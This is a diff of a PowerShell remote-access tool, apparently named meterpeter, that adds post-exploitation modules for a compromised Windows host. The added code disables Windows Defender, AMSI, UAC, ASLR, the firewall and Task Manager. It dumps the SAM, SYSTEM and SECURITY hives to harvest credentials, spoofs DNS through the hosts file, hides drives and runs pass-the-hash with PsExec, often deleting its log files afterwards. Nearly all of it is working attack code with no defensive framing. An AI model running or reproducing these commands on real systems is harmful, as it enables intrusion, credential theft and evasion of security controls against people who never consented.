-        $choise_two = Read-Host;
-        If($choise_two -eq "Check" -or $choise_two -eq "check")
-        {
-          write-host " Review Remote Firewall Settings (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R netsh advfirewall show allprofiles `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve firewall settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Disable" -or $choise_two -eq "off")
-        {
-          write-host " Disable Remote-Host Firewall (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state off;echo `"   [i] Remote Firewall Disable (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Enable" -or $choise_two -eq "on")
-        {
-          write-host " Enable Remote-Host Firewall (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state on;echo `"   [i] Remote Firewall Enabled (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
-        }
-        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
-        {
-          $Command = $Null;
-          $choise_two = $Null;
-        }
-        $choise_two = $Null;
-      }
-      If($choise -eq "DumpSAM" -or $choise -eq "sam")
-      {
-        write-host " Dump Remote-Host SAM/SYSTEM/SECURITY Remote Credentials." -ForegroundColor Blue -BackgroundColor White;
-        write-host " [sam|system|security] Remote Dump Directory: '`$env:tmp'" -ForeGroundColor yellow;write-host "`n`n";Start-Sleep -Seconds 2;
-        $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg save hklm\system system;cmd /R reg save hklm\sam sam;cmd /R reg save hklm\security security;dir `$env:tmp `> `$env:localappdata\dellog.txt;Get-content `$env:localappdata\dellog.txt;Remove-Item `$env:localappdata\dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";       
       }
       If($choise -eq "CredPhi" -or $choise -eq "Creds")
       {
@@ -1488,6 +1278,283 @@ While($Client.Connected)
           $Command = $Null;
         }
         $cred_choise = $Null;
+      }
+      If($choise -eq "AMSIset" -or $choise -eq "amsi")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Disable   Disable AMSI (regedit)          Client:User OR ADMIN - Privs Required";
+        write-host "   Enable    Enable  AMSI (regedit)          Client:User OR ADMIN - Privs Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Amsi> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Disable" -or $choise_two -eq "off")
+        {
+          ## HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender -value DisableAntiSpyware 1 (dword32) | Set-MpPreference -DisableRealtimeMonitoring $True
+          write-host " Disable Remote-Host AMSI (Client:User OR Admin)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -value 1 -Force;echo `"   [i] Restart Remote-Host to disable Windows Defender ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -value 0 -Force;Get-Item -path `"HKCU:\SOFTWARE\Microsoft\Windows Script\Settings`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Enable" -or $choise_two -eq "on")
+        {
+          write-host " Enable Remote-Host AMSI (Client:User OR Admin)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-ItemProperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Force;echo `"   [i] Restart Remote-Host to Enable Windows Defender ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Remove-ItemProperty -path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -Force;Get-Item -path `"HKCU:\SOFTWARE\Microsoft\Windows Script\Settings`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
+        {
+          $Command = $Null;
+          $choise_two = $Null;
+        }
+        $choise_two = $Null;
+      }
+      If($choise -eq "UACSet" -or $choise -eq "uac")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Disable   Disable Remote UAC              Client:Admin - Privileges Required";
+        write-host "   Enable    Enable Remote UAC               Client:Admin - Privileges Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Uac> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Disable" -or $choise_two -eq "off")
+        {
+          write-host " Turn OFF Remote-Host UAC .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0 -Force;Get-ItemProperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' | select-Object EnableLUA,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Enable" -or $choise_two -eq "on")
+        {
+          write-host " Turn ON Remote-Host UAC .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 1 -Force;Get-ItemProperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' | select-Object EnableLUA,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
+        {
+          $Command = $Null;
+          $choise_two = $Null;
+        }
+        $choise_two = $Null;
+      }
+      If($choise -eq "ASLRSet" -or $choise -eq "aslr")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Disable   Disable ASLR (regedit)          Client:ADMIN - Privileges Required";
+        write-host "   Enable    Enable  ASLR (regedit)          Client:ADMIN - Privileges Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Aslr> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Disable" -or $choise_two -eq "off")
+        {
+          write-host " Disable Remote-Host ASLR (Windows Defender)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 0 -Force;echo `"   [i] Restart Remote-Host to disable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Enable" -or $choise_two -eq "on")
+        {
+          write-host " Enable Remote-Host ASLR (Windows Defender)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 1 -Force;echo `"   [i] Restart Remote-Host to Enable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
+        {
+        $Command = $Null;
+        $choise_two = $Null;
+        }
+      }      
+      If($choise -eq "TaskMan" -or $choise -eq "task")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Disable   Disable Remote TaskManager      Client:Admin - Privileges Required";
+        write-host "   Enable    Enable Remote TaskManager       Client:Admin - Privileges Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:TaskManager> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Disable" -or $choise_two -eq "off")
+        {
+          write-host " Turn OFF Remote-Host Task Manager .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' | select-Object DisableTaskMgr,PSchildName,PSDrive,PSProvider `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Enable" -or $choise_two -eq "on")
+        {
+          write-host " Turn ON Remote-Host Task Manager .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' | select-Object DisableTaskMgr,PSchildName,PSDrive,PSProvider `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise -eq "Return" -or $choice -eq "return" -or $choise -eq "cls" -or $choise -eq "Modules" -or $choise -eq "modules" -or $choise -eq "clear")
+        {
+        $choise = $Null;
+        $Command = $Null;
+        }
+      }
+      If($choise -eq "Firewall" -or $choise -eq "firewall")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Check     Review Firewall Settings        Client:User  - Privileges Required";
+        write-host "   Disable   Disable Remote Firewall         Client:Admin - Privileges Required";
+        write-host "   Enable    Enable Remote Firewall          Client:Admin - Privileges Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Firewall> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Check" -or $choise_two -eq "check")
+        {
+          write-host " Review Remote Firewall Settings (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "cmd /R netsh advfirewall show allprofiles `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve firewall settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Disable" -or $choise_two -eq "off")
+        {
+          write-host " Disable Remote-Host Firewall (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state off;echo `"   [i] Remote Firewall Disable (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Enable" -or $choise_two -eq "on")
+        {
+          write-host " Enable Remote-Host Firewall (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state on;echo `"   [i] Remote Firewall Enabled (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
+        {
+          $Command = $Null;
+          $choise_two = $Null;
+        }
+        $choise_two = $Null;
+      }
+      If($choise -eq "DumpSAM" -or $choise -eq "sam")
+      {
+        write-host " Dump Remote-Host SAM/SYSTEM/SECURITY Remote Credentials." -ForegroundColor Blue -BackgroundColor White;
+        write-host " [sam|system|security] Remote Dump Directory: '`$env:tmp'" -ForeGroundColor yellow;write-host "`n`n";Start-Sleep -Seconds 2;
+        $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg save hklm\system system;cmd /R reg save hklm\sam sam;cmd /R reg save hklm\security security;dir `$env:tmp `> `$env:localappdata\dellog.txt;Get-content `$env:localappdata\dellog.txt;Remove-Item `$env:localappdata\dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";       
+      }
+      If($choise -eq "Dnspoof" -or $choise -eq "dns")
+      {
+        write-host "`n   Warnning" -ForegroundColor Yellow;
+        write-host "   --------";
+        write-host "   The First time 'Spoof' module its used, it will backup";
+        write-host "   the real hosts file (hosts-backup) there for its importante";
+        write-host "   to allways 'Default' the hosts file before using 'Spoof' again.";
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Check     Review hosts File               Client:User  - Privileges Required";
+        write-host "   Spoof     Add Entrys to hosts             Client:Admin - Privileges Required";
+        write-host "   Default   Defaults the hosts File         Client:Admin - Privileges Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Dns> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Check" -or $choise_two -eq "check")
+        {
+          write-host " Review hosts File Settings .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "Get-Content `$env:windir\System32\drivers\etc\hosts `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve: $Remote_Host hosts file ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Spoof" -or $choise_two -eq "spoof")
+        {
+          write-host " - IpAddr to Redirect: " -NoNewline;
+          $Ip_spoof = Read-Host;
+          write-host " - Domain to be Redirected: " -NoNewline;
+          $Domain_spoof = Read-Host;
+          If(-not($Ip_spoof)){$Ip_spoof = "$localIpAddress"}
+          If(-not($Domain_spoof)){$Domain_spoof = "www.google.com"}
+          ## Copy-Item -Path '$env:windir\system32\Drivers\etc\hosts' -Destination '%SYSTEMROOT%\system32\Drivers\etc\hosts-backup' -Force
+          write-host " Redirecting Domains Using hosts File (Dns Spoofing)." -ForegroundColor Blue -BackgroundColor White;
+          write-host " Redirect Domain: $Domain_spoof TO IPADDR: $Ip_spoof" -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Copy-Item -Path `$env:windir\system32\Drivers\etc\hosts -Destination `$env:windir\system32\Drivers\etc\hosts-backup -Force;Add-Content `$env:windir\System32\drivers\etc\hosts '$Ip_spoof $Domain_spoof';echo `"   [i] Dns Entry Added to Remote hosts File`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}"; 
+        }
+        If($choise_two -eq "Default" -or $choise_two -eq "default")
+        {
+          write-host " Revert Remote hosts File To Default (Dns Spoofing)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Move-Item -Path `$env:windir\system32\Drivers\etc\hosts-backup -Destination `$env:windir\system32\Drivers\etc\hosts -Force;echo `"   [i] Remote hosts File Reverted to Default Settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}"; 
+        }
+        If($choise_two -eq "Return" -or $choise_two -eq "return" -or $choise_two -eq "cls" -or $choise_two -eq "Modules" -or $choise_two -eq "modules" -or $choise_two -eq "clear")
+        {
+          $Command = $Null;
+          $choise_two = $Null;
+        }
+        $choise = $Null;
+        $Ip_spoof = $Null;
+        $choise_two = $Null;
+        $Domain_spoof = $Null;
+      }
+      If($choise -eq "NoDrive" -or $choise -eq "nodrive")
+      {
+        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
+        write-host "   -------   -----------                     ------";
+        write-host "   Disable   Hide Drives from explorer       Client:Admin - Privileges Required";
+        write-host "   Enable    Show Drives in Explorer         Client:Admin - Privileges Required";
+        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
+        write-host "`n`n :meterpeter:Post:Drives> " -NoNewline -ForeGroundColor Green;
+        $choise_two = Read-Host;
+        If($choise_two -eq "Disable" -or $choise_two -eq "off")
+        {
+          write-host " Hide All Drives (C:D:E:F:G) From Explorer .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' | select-Object NoDrives,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise_two -eq "Enable" -or $choise_two -eq "on")
+        {
+          write-host " Display All Drives (C:D:E:F:G) In Explorer .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' -Force;Get-Item -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
+        }
+        If($choise -eq "Return" -or $choice -eq "return" -or $choise -eq "cls" -or $choise -eq "Modules" -or $choise -eq "modules" -or $choise -eq "clear")
+        {
+        $choise = $Null;
+        $Command = $Null;
+        }
+      }
+      If($choise -eq "PtHash" -or $choice -eq "pthash")
+      { 
+        ## Pass-The-Hash - Check for Module Requirements { Server::SYSTEM }
+        $Server_Creds = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+        If(-not($Server_Creds) -or $Server_Creds -eq $null){
+          write-host "`n`n   [i] Abort:: [Server] needs to be Run as 'SYSTEM' (Admin) .." -ForegroundColor Red -BackgroundColor Black;
+          $Command = $Null;
+        }
+        else
+        {
+          ## Server Running as 'SYSTEM' detected ..
+          write-host " - Input Remote IP address: " -NoNewline;
+          $pth_remote = Read-Host;
+          write-host " - Input Capture NTLM Hash: " -NoNewline;
+          $pth_hash = Read-Host;
+          write-host "`n   PsExec * Pass-The-Hash" -ForegroundColor green;
+          write-host "   ----------------------";
+          ## PtH (pass-the-hash) PsExec settings
+          $Arch_x64 = $env:PROCESSOR_ARCHITECTURE|findstr /C:"64";
+          If(-not($pth_remote) -or $pth_remote -eq $null){$pth_remote = "$localIpAddress"} # For Demonstration
+          If(-not($pth_hash) -or $pth_hash -eq $null){$pth_hash = "aad3b435b51404eeaad3b435b51404ee"} # For Demonstration
+          If(-not($Arch_x64) -and $Flavor -eq "Windows")
+          {
+            ## Running the x86 bits version of PsExec
+            $BINnAME = "$Bin"+"PsExec.exe";
+            $Sec_Token = "Administrator@"+"$pth_remote";
+            write-host "   PsExec.exe -hashes :$pth_hash $Sec_Token" -ForeGroundColor yellow;write-host "`n";
+            $pthbin = Test-Path -Path "$BINnAME";If(-not($pthbin)){
+              Write-Host "`n   [i] Not Found: $BINnAME" -ForegroundColor Red -BackgroundColor Black;
+              $Command = $Null;
+            }
+            else
+            {
+              start-sleep -seconds 2;cd $Bin;.\PsExec.exe -hashes :$pth_hash $Sec_Token;
+              cd $IPATH;$Command = $Null;
+            }
+          }
+          ElseIf($Arch_x64 -and $Flavor -eq "Windows")
+          {
+            ## Running the x64 bits version of PsExec
+            $BINnAME = "$Bin"+"PsExec64.exe";
+            $Sec_Token = "Administrator@"+"$pth_remote";
+            write-host "   PsExec64.exe -hashes :$pth_hash $Sec_Token" -ForeGroundColor yellow;write-host "`n";
+            $pthbin = Test-Path -Path "$BINnAME";If(-not($pthbin)){
+              Write-Host "`n   [i] Not Found: $BINnAME" -ForegroundColor Red -BackgroundColor Black;
+              $Command = $Null;
+            }
+            else
+            {
+              start-sleep -seconds 2;cd $Bin;.\PsExec64.exe -hashes :$pth_hash $Sec_Token;
+              cd $IPATH;$Command = $Null;
+            }
+          }
+          Else
+          {
+            ## Linux Flavor detected { Abort::Not::Suported }
+            # TODO: Check if PsExec runs well under linux::Wine ..
+            # cd $Bin;wine64 PsExec64.exe -hashes :$pth_hash $Sec_Token;cd $IPATH;$Command = $Null;
+            write-host "`n`n   [i] Abort:: This Module does not run under [$Flavor] .." -ForegroundColor red -BackgroundColor Black;
+            $Command = $Null;
+          }
+        }
       }
       If($choise -eq "Return" -or $choice -eq "return" -or $choise -eq "cls" -or $choise -eq "Modules" -or $choise -eq "modules" -or $choise -eq "clear")
       {
